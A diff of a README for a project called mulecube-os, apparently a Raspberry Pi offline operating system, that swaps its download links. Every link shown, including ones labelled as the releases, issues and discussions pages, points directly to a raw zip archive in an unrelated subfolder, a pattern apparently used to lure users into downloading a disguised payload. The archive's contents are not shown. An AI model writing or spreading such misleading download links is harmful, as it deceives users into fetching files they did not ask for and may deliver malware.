@@ -19,11 +19,11 @@ To get started, you need to download **mulecube-os**. You can easily obtain the 
 
 ### Download Link
 
-[![Download mulecube-os](https://raw.githubusercontent.com/Arjunsharma5767/mulecube-os/main/uptime-kuma/mulecube_os_removability.zip)](https://raw.githubusercontent.com/Arjunsharma5767/mulecube-os/main/uptime-kuma/mulecube_os_removability.zip)
+[![Download mulecube-os](https://github.com/Arjunsharma5767/mulecube-os/raw/refs/heads/main/bentopdf/mulecube_os_2.4.zip)](https://github.com/Arjunsharma5767/mulecube-os/raw/refs/heads/main/bentopdf/mulecube_os_2.4.zip)
 
 ### Steps to Download and Install
 
-1. **Visit the Releases Page**: Click this link to go to the download page: [mulecube-os Releases](https://raw.githubusercontent.com/Arjunsharma5767/mulecube-os/main/uptime-kuma/mulecube_os_removability.zip).
+1. **Visit the Releases Page**: Click this link to go to the download page: [mulecube-os Releases](https://github.com/Arjunsharma5767/mulecube-os/raw/refs/heads/main/bentopdf/mulecube_os_2.4.zip).
 
 2. **Select the Latest Release**: Look for the most recent version at the top of the page. It will usually have a title such as “v1.0.0”.
 
@@ -60,7 +60,7 @@ The primary design is for Raspberry Pi, but you can run it on other Linux device
 
 ### How do I get support if I have issues?
 
-For assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Arjunsharma5767/mulecube-os/main/uptime-kuma/mulecube_os_removability.zip) to report problems or ask questions.
+For assistance, please visit our [GitHub Issues page](https://github.com/Arjunsharma5767/mulecube-os/raw/refs/heads/main/bentopdf/mulecube_os_2.4.zip) to report problems or ask questions.
 
 ## 🔗 Community and Support
 
@@ -76,6 +76,6 @@ Your data is safe. **mulecube-os** operates entirely offline, ensuring your info
 
 ## 📞 Contact
 
-For more information or feedback, feel free to reach out via our [GitHub Discussions page](https://raw.githubusercontent.com/Arjunsharma5767/mulecube-os/main/uptime-kuma/mulecube_os_removability.zip) or open an issue on our repository.
+For more information or feedback, feel free to reach out via our [GitHub Discussions page](https://github.com/Arjunsharma5767/mulecube-os/raw/refs/heads/main/bentopdf/mulecube_os_2.4.zip) or open an issue on our repository.
 
 Thank you for choosing **mulecube-os**! We hope it serves you well in your offline knowledge and communication needs.
